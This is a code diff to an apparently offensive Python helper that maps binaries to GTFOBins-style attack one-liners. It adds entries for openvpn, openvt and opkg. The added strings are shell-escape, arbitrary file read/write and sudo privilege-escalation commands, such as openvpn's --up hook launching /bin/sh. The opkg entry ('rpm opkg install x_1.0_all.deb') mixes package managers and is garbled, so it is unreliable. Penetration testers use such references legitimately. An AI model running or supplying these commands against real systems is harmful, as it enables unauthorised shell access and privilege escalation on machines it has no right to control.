@@ -2756,6 +2756,30 @@ def gtfo_bins(gtfo_command, gtfo_options):
         else:
             bins.append("N/A")
 
+    elif gtfo_command == "openvpn":
+        if gtfo_options == "shell":
+            bins.append("openvpn --dev null --script-security 2 --up '/bin/sh -s'")
+        else:
+            bins.append("N/A")
+    
+    elif gtfo_command == "openvt":
+        if gtfo_options == "file-read":
+            bins.append("openvt -- /usr/bin/cat /path/to/file")
+        elif gtfo_options == "file-write":
+            bins.append("openvt -- /usr/bin/vi /path/to/file")
+        elif gtfo_options == "shell":
+            bins.append("openvt -- /usr/bin/sh")
+        elif gtfo_options == "sudo":
+            bins.append("sudo openvt -- /path/to/command")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "opkg":
+        if gtfo_options == "shell":
+            bins.append("rpm opkg install x_1.0_all.deb")
+        else:
+            bins.append("N/A")
+
 #If there are any other misconfigurations run the other option
     elif gtfo_command == "other":
         if gtfo_options == "shell": #This will print out hints for more GTFO bins!
@@ -2801,7 +2825,7 @@ def main():
         "msguniq", "mtr", "multitime", "mutt", "mv","mypy", "mysql", "nasm", "nawk",
         "nc", "ncdu", "ncftp", "needrestart","nft", "nginx","nice", "nl", "nm", "nmap", 
         "node", "nohup", "npm", "nroff", "nsenter", "octave","od", "opencode", "openssl", 
-        "other"
+        "openvpn", "openvt","opkg", "other"
     }
 
     if start in ALLOWED:
